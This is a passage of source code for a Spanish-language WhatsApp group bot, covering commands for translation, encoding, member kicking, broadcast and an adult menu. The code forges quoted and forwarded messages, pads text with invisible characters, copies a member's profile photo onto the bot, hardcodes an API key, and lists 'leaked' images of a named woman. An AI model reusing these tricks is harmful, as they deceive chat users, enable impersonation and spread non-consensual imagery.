hasil = `${teksa}͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏${teks2}`
samu330.sendMessage(from, hasil, text, {
quoted: fimg
})
break
		   
case 'enline':
case 'online':
										  
if (!isGroup) return reply(`Solo para grupos`)
let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
let online = [...Object.keys(samu330.chats.get(ido).presences), samu330.user.jid]
samu330.sendMessage(from, '*Lista de usuarios en linea*:\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, MessageType.text, {
quoted: ftoko,
contextInfo: { mentionedJid: online }
})
break

case 'soyyo':
if (!isRegister) return reply(mess.only.usrReg)
try {
ppimg = await samu330.getProfilePicture(`${sender.split('@')[0]}@c.us`)
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
nombredelwe = wa.getUserName(sender)
teks = `‣ *Nombre* : ${nombredelwe}
‣ *Número* : ${sender.split("@")[0]}
‣ *Link* : wa.me/${sender.split("@")[0]}`
its = await getBuffer (ppimg)
samu330.sendMessage(from, its, image, {
quoted: fliveLoc, caption: teks, contextInfo: {"forwardingScore": 9999, "isForwarded": true}
})

break
case 'pastebin':
if (args.length < 1) return reply('Escribe el texto que se mostrara en pastebin.')
paste = `${args.join(' ')}`
 
anu = await getJson(`https://api-anoncybfakeplayer.herokuapp.com/pastebin?text=${paste}`, {method: 'get'})
samu330.sendMessage(from, `${anu.result}`, MessageType.text, {quoted: ftoko, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
break

case 'abinario':
if (args.length < 1) return reply('Escribe el texto a convertir a codigo binario.')
encbinary = `${args.join(' ')}`
anu = await getJson(`https://api.anoncybfakeplayer.com/api/binary/?encode=${encbinary}`, {method: 'get'})
samu330.sendMessage(from, `${anu.result}`, MessageType.text, {quoted: ftoko, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
break
case 'binatext':
if (args.length < 1) return reply('Porfavor, pega o escribe el codigo binario para convertir a texto.')
decbin = `${args.join(' ')}`
anu = await getJson(`https://api.anoncybfakeplayer.com/api/binary/?decode=${decbin}`, {method: 'get'})
samu330.sendMessage(from, `${anu.result}`, MessageType.text, {quoted: ftoko, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
break

case 'aoctal':
if (args.length < 1) return reply('Escribe el texto a convertir a codigo octal.')
encbinary = `${args.join(' ')}`
anu = await getJson(`https://api.anoncybfakeplayer.com/api/octal/?encode=${encbinary}`, {method: 'get'})
samu330.sendMessage(from, `${anu.result}`, MessageType.text, {quoted: ftoko, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
break
case 'octalatext':
if (args.length < 1) return reply('Porfavor, pega o escribe el codigo octal para convertir a texto.')
decbin = `${args.join(' ')}`
anu = await getJson(`https://api.anoncybfakeplayer.com/api/octal/?decode=${decbin}`, {method: 'get'})
samu330.sendMessage(from, `${anu.result}`, MessageType.text, {quoted: ftoko, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
break


case 'ahex':
if (args.length < 1) return reply('Escribe el texto a convertir a codigo hex.')
encbinary = `${args.join(' ')}`
anu = await getJson(`https://api.anoncybfakeplayer.com/api/hex/?encode=${encbinary}`, {method: 'get'})
samu330.sendMessage(from, `${anu.result}`, MessageType.text, {quoted: ftoko, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
break
case 'hexatext':
if (args.length < 1) return reply('Porfavor, pega o escribe el codigo hex para convertir a texto.')
decbin = `${args.join(' ')}`
anu = await getJson(`https://api.anoncybfakeplayer.com/api/hex/?decode=${decbin}`, {method: 'get'})
samu330.sendMessage(from, `${anu.result}`, MessageType.text, {quoted: ftoko, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
break
case 'tourl':
if (!isRegister) return reply(mess.only.userB)
var imgbb = require('imgbb-uploader')
if ((isMedia && !samu.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(samu).replace('quotedM','m')).message.extendedTextMessage.contextInfo : sam
 
owgi = await samu330.downloadAndSaveMediaMessage(ger)
anu = await imgbb('20a14861e4f7591f3dc52649cb07ae02', owgi)
teks = `${anu.display_url}`
reply(teks)
}
break

case 'menu6':
addFilter(from)
if (!isNsfw) return reply(mess.nsfw)
addLevelingLevel(sender, 5)		
samu330.sendMessage(from, { degreesLatitude: `0`, degreesLongitude: `0`, name: '🔥insane🍒', address : `🗡Created by Samu330`, sequenceNumber: '99999', jpegThumbnail: fs.readFileSync('./src/+18.jpg')}, MessageType.liveLocation, {quoted : sam})
let nopor = samu330.prepareMessageFromContent(from, {
"listMessage":  {
"title": "*😏Bienvenido al menu 6*",
"description": `\n\nQue es lo que buscas🍒?\n\n	*Si no puedes ver, o selccionar la lsita de mensajes de abajo, desactiva la opcion de "Hacer el texto seleccionable", en las configuraciones de conversacion de tu WhatsApp Mod.*`,
"buttonText": "Click Aqui",
"listType": "SINGLE_SELECT",
"sections": [
{
"rows": [
{
"title": "Imagenes Filtradas De la Hermosa Belle Delphine😏!!",
"rowId": `${prefix}belle`
},
{
"title": "🍑VIDEO UNICO Y EXCLUSIVO",
"rowId": `VIP`
},	
{
"title": `Porno Real🔥`,
"rowId": `${prefix}porno`
},
{
"title": "Porno de Lesbianas😊",
"rowId": `${prefix}lesbian`
},
{
	"title": `Bonitas Tetas🍇`,
	"rowId": `${prefix}tetas`
	},
	{
	"title": "Culos Hermosos🍑",
	"rowId": `${prefix}ass`
	},
	{
		"title": `Pussy's🥟`,
		"rowId": `${prefix}pussy`
		},
		{
		"title": "Waifu Hentai🌸",
		"rowId": `${prefix}xwaifu`
		},
		{
			"title": "Neko Hentai🍒",
			"rowId": `${prefix}xneko`
			},
			{
			"title": "Trap Hentai🍌",
			"rowId": `${prefix}trap`
			},
			{
				"title": "Blow Hentai🍆",
				"rowId": `${prefix}blow`
				}
]
}
]
}
}, {})
samu330.relayWAMessage(nopor, {waitForAck: true})
break

case 'simi':

samu330.updatePresence(from, Presence.composing)
texto = body.slice(5)
sim = await getJson(`https://api.simsimi.net/v2/?text=${texto}&lc=es&lang=es`)
smuu = (`${sim.success}`)
samu330.sendMessage(from, smuu, MessageType.text, {quoted: { key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
"productMessage": {
"product": {
"productImage":{
"mimetype": "image/jpeg",
"jpegThumbnail": fs.readFileSync(`./src/simi.jpg`)
},
"title": `➫𝐒𝐢𝐦𝐬𝐢𝐦𝐢 ️`,
"description": `${texto}`,
"currencyCode": '',
"priceAmount1000": "999999999999999999999",
"retailerId": 'TOM',
"productImageCount": 999
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}
}
})

break
case 'emoji':

if (args.length == 0) return reply(`Ejemplo: ${prefix + command} 😭`)
emoji = args[0]
try {
emoji = encodeURIComponent(emoji[0])
} catch {
emoji = encodeURIComponent(emoji)
}
ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/smoji/${emoji}?apikey=${api}`)
await samu330.sendMessage(from, ini_buffer, sticker, { quoted: ftoko })
break



case 'kick':
case 'chau':
case 'eliminar':
if (!isGroup) return reply(mess.only.group)
if (!isAdmin) return reply(mess.only.admin)
if (!botAdmin) return reply(mess.only.Badmin)
                if (sam.message.extendedTextMessage != undefined){
                mentioned = sam.message.extendedTextMessage.contextInfo.mentionedJid
		if (!mentioned) return reply(`exampol xd: ${prefix + command} @participante... o etiqueta el mensaje de la persona a eliminar`)
		await wa.FakeTokoForwarded(from, `Baaaiii...`, '')
		if (mentionUser.length == 1)
		samu330.groupRemove(from, mentionUser)
		//samu330.groupRemove(from, mentioned)
		} else {
	        await wa.FakeTokoForwarded(from, `Baaaiii...`, '')
		samu330.groupRemove(from, mentioned)
		}
		break

case 'wpsearch':

if (args.length == 0) return reply(`Example: ${prefix + command} gatos`)
query = args.join(' ')
get_result = await getJson(`https://api.lolhuman.xyz/api/wallpaper?apikey=${api}&query=${query}`)
ini_buffer = await getBuffer(get_result.result)
await samu330.sendMessage(from, ini_buffer, image, { quoted: ftoko })

break

case 'traducir':
if (args.length == 0) return reply(`Example: ${prefix + command} es Hi bro`)
idioma = args[0]
args.shift()
ini_txt = args.join(' ')
get_result = await getJson(`https://api.lolhuman.xyz/api/translate/auto/${idioma}?apikey=${api}&text=${ini_txt}`)
get_result = get_result.result
init_txt = `Traduccion de : ${get_result.from}\n`
init_txt += `a : ${get_result.to}\n`
init_txt += `Original : ${get_result.original}\n`
init_txt += `Traducido : ${get_result.translated}\n`
init_txt += `Pronunciacion : ${get_result.pronunciation}\n`
reply(init_txt)

break
case 'ping':
var groups = samu330.chats.array.filter(v => v.jid.endsWith('g.us'))
var privat = samu330.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
var ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
uptime = process.uptime();
const timestamp = speed();
const totalChat = await samu330.chats.all()
const latensi = speed() - timestamp
//	const total12 = math(`${groups.length}*${privat.length}`)
teks = `_Pong_ xD\n*ESTADISTICAS DEL BOT:*\n*- Group Chats :* ${groups.length}\n*- Private Chats :* ${privat.length}\n*- Total Chats :* ${totalChat.length}\n*- Speed :* ${latensi.toFixed(4)} _Second_\n*- Active Time :* ${uptime}\n\n*PHONE STATISTICS:*\n*- 📱Capacidad de Ram :* ${ram2}\n*- 💻Plataforma :* ${os.platform()}\n*- 🌐Hostname :* ${os.hostname()}\n*- 🕐Uptime :* ${os.uptime()}\n*- 🪀Wa Version:* ${samu330.user.phone.wa_version}\n*- 📡Os Version:* ${samu330.user.phone.os_version}\n*- 🔐Device Manufacturer:* ${samu330.user.phone.device_manufacturer}\n*- 📲Device Model:* ${samu330.user.phone.device_model}\n*- 🧬Os Build Number:* ${samu330.user.phone.os_build_number}\n${os.loadavg()}\n\n${os.networkInterfaces()}\n\n${os.cpus()}`
samu330.sendMessage(from, teks, MessageType.text, {quoted: fdoc, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
break
case 'clonar':
if (!isGroup) return reply(mess.only.group)
if (args.length < 1) return reply('Etiqueta a alguien para utilizar su foto!!!')
if (sam.message.extendedTextMessage === undefined || sam.message.extendedTextMessage === null) return reply('Etiqueta a alguien')
mentioned = sam.message.extendedTextMessage.contextInfo.mentionedJid[0]
let {jid, id1, notify } = groupMembers.find(x => x.jid === mentioned)
try {
pp = await samu330.getProfilePicture(id)
buffer = await getBuffer(pp)
samu330.updateProfilePicture(botNumber, buffer)
mentions(`La foto de perfil se actualizó correctamente con la foto de perfil de: @${id.split('@')[0]}`, [jid], true)
} catch (e) {
reply(mess.ferr)
}

break
case 'queanime':
if ((isMedia && !sam.message.videoMessage || isQuotedImage) && args.length == 0) {
 
const encmediaa = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
const mediaa = await samu330.downloadMediaMessage(encmediaa)
await wait(mediaa).then(res => {
samu330.sendMessage(from, res.video, video, { quoted: ftoko, caption: res.teks.trim() })
}).catch(err => {
reply(err)
})
} else {
reply('Envia la magen para poder buscar el anime')
}
break
case 'colores':
if (args.length < 1) return reply('Y el texto?')
var teks = encodeURIComponent(args.join(' '))
const attp1 = await getBuffer(`https://api.xteam.xyz/attp?file&text=${teks}`)
samu330.sendMessage(from, attp1, sticker, {quoted: ftoko, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
break



case 'bc':
if (!isOwner) return reply('Solo *Samu* puede usar este comando')
if (args.length < 1) return reply('Y el anuncio?')
anu = await samu330.chats.all()
if (isMedia && !sam.message.videoMessage || isQuotedImage) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo : sam
buff = await samu330.downloadMediaMessage(encmedia)
for (let _ of anu) {
samu330.sendMessage(_.jid, buff, image, {caption: `${body.slice(4)}\n\n ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏